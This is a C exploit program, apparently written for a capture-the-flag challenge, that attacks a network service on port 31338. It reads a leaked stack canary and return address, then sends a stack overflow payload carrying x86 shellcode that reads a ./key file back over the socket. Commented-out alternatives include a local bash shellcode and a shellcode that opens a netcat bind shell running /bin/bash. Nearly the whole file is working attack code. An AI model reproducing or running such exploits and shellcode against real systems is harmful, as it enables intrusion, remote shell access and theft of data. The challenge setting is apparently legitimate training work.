#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

// Target connection information
#define TARGET_ADDR "localhost" /* "128.238.66.212"*/
#define TARGET_PORT "31338"

// Buffer sizes
#define RECV_BUFFER 107
#define SEND_BUFFER 2100

// Offsets in memory found with pattern.pl
#define ROP_OFFSET 2064
#define CANARY_OFFSET 2048
#define SHELL_OFFSET 0

/* Local Shell 
#define ARRAY_LEN 44
char array[] = {
		0x31, 0xC0, 0x89, 0xC3, 0x83, 0xE8, 0xBA, 0xCD, 0x80, 0xEB, 0x12, 0x31, 0xC0, 0x5E, 0x50,
		0x56, 0x89, 0xF3, 0x89, 0xE1, 0x89, 0xC2, 0x83, 0xE8, 0xF5, 0xCD, 0x80, 0xEB, 0xFE, 0xE8,
		0xE9, 0xFF, 0xFF, 0xFF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x62, 0x61, 0x73, 0x68, 0x00
}; */ 

/* Reuse socket to send ./key back (Thanks to ucefkh) */
#define ARRAY_LEN 114
char array[] = {
		0xEB, 0x65, 0x5E, 0xB8, 0x04, 0x00, 0x00, 0x00, 0xBB, 0x04, 0x00, 0x00, 0x00, 0x89, 0xF1,
		0xBA, 0x05, 0x00, 0x00, 0x00, 0xCD, 0x80, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x89, 0xF3, 0xB9,
		0x00, 0x00, 0x00, 0x00, 0xBA, 0x00, 0x00, 0x00, 0x00, 0xCD, 0x80, 0x89, 0xC7, 0x6A, 0x00,
		0xB8, 0x03, 0x00, 0x00, 0x00, 0x89, 0xFB, 0x89, 0xE1, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xCD,
		0x80, 0x83, 0xF8, 0x00, 0x7E, 0x1E, 0xB8, 0x04, 0x00, 0x00, 0x00, 0xBB, 0x04, 0x00, 0x00,
		0x00, 0x89, 0xE1, 0xBA, 0x01, 0x00, 0x00, 0x00, 0xCD, 0x80, 0xEB, 0xD6, 0xB8, 0x06, 0x00,
		0x00, 0x00, 0x89, 0xFB, 0xCD, 0x80, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xCD, 0x80, 0xE8, 0x96,
		0xFF, 0xFF, 0xFF, 0x2E, 0x2F, 0x6B, 0x65, 0x79, 0x00
}; 

/* Run the following command on the remote target: 'nc -l -p 12345 -e /bin/bash' 
#define ARRAY_LEN 77
char array[] = {
		0xEB, 0x1D, 0x5E, 0x31, 0xC0, 0x50, 0x8D, 0x46, 0x0B, 0x50, 0x8D, 0x46, 0x08, 0x50, 0x56,
		0x89, 0xE1, 0xB8, 0x0B, 0x00, 0x00, 0x00, 0x89, 0xF3, 0xBA, 0x00, 0x00, 0x00, 0x00, 0xCD,
		0x80, 0xE8, 0xDE, 0xFF, 0xFF, 0xFF, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x73, 0x68, 0x00, 0x2D,
		0x63, 0x00, 0x6E, 0x63, 0x20, 0x2D, 0x6C, 0x20, 0x2D, 0x70, 0x20, 0x31, 0x32, 0x33, 0x34,
		0x35, 0x20, 0x2D, 0x65, 0x20, 0x2F, 0x62, 0x69, 0x6E, 0x2F, 0x62, 0x61, 0x73, 0x68, 0x20,
		0x20, 0x00
}; */

int main()
{
	struct addrinfo hints, *res, *p;
	char buffer[RECV_BUFFER+1];
	int sfd, rcv, *stack_cookie, *ret_addr;
	void* send_buffer;

	// Setup some space for the payload
	send_buffer = malloc(SEND_BUFFER);

	// Connect to the server
	// IPV4 only and to hell with error checking.
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	getaddrinfo(TARGET_ADDR, TARGET_PORT, &hints, &res);
	sfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
	connect(sfd, res->ai_addr, res->ai_addrlen);

	// Get some daums... right.
	rcv = recv(sfd, (void*)buffer, RECV_BUFFER, MSG_WAITALL);

	// Set the pointer to shell code. This is the first 4 bytes sent to us.
	ret_addr = (int*)(buffer);

	// set the stack cookie, this is the next 4 bytes sent to us.
	stack_cookie = (int*)(buffer+4);
	
	// Print some debugging data for those following along in gdb
	write(1, buffer, rcv);
	printf("\n> RET Address: 0x%X\n", *ret_addr);
	printf("> Cookie: 0x%X\n\n", *stack_cookie);

	// Inject stack cookie
	memcpy(send_buffer+CANARY_OFFSET, (void*)stack_cookie, 4);

	// inject the RET address that points to the shell code
	memcpy(send_buffer+ROP_OFFSET, (void*)ret_addr, 4);
	
	//inject shellcode
	memcpy(send_buffer+SHELL_OFFSET, (void*)array, ARRAY_LEN);

	// Send it up.
	send(sfd, send_buffer, SEND_BUFFER, 0);

	// Print watever it gives us back. hopefully it has the key in it.
	memset(send_buffer, 0x00, SEND_BUFFER);
	rcv = recv(sfd, send_buffer, SEND_BUFFER, MSG_WAITALL);
	write(1, send_buffer, rcv);

	// even hackers should clean the dishes.
	close(sfd);
	freeaddrinfo(res);
	free(send_buffer);

	return EXIT_SUCCESS;
}

